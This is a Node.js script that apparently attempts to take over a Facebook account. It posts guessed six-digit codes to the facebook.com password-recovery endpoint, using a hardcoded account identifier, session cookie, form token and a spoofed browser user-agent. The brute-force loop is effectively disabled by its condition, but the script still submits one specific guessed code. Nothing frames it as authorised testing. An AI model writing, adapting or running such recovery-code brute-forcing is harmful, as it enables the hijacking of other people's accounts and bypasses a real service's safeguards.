'use strict';

const log = console.log.bind(console);
const Http2Client = require('./http2-client');
const helpers = require('./helpers');
const child_process = require('node:child_process');
const fs = require('node:fs');

const { rand, randomString } = helpers;

const httpClient = new Http2Client(false);

const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';

(async () => {
  const cuid = 'AYhFfb0t5vLTNBU02BK9xuH23Zr54CK8g7YuvEez2f2Ce5iZzYmN2wlvkq-qNBvAzUDwF29h6DS9MKGY1i16wR4zKilBIgfhmrjVimTDANTwiQ';
  const datr = 'LS4uaKqjexvPknJhuSVD1BWM';
  const lsd = 'AVrCihG3OoQ';
  const url = 'https://www.facebook.com/recover/code/?cuid='+cuid;
  const headers = {
    'Cookie': 'datr='+datr,
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': USER_AGENT,
    'Sec-Fetch-Site': 'same-origin'
  };
  // const codes = require('./codes');

  // child_process.exec('siren warn');

  const p = [];
  for (let i = 0, code; 0 > i; ++i) {
    code = rand(111111, 999999);
    p.push(new Promise(r => httpClient.post(url, headers, 'lsd='+lsd+'&n='+code).then(res => (log(res.statusCode), r()))));
  }

  Promise.all(p).then(() => {
    log('end');
    httpClient.post(url, headers, 'lsd='+lsd+'&n=281667').then(res => log(res.statusCode));
  });
})();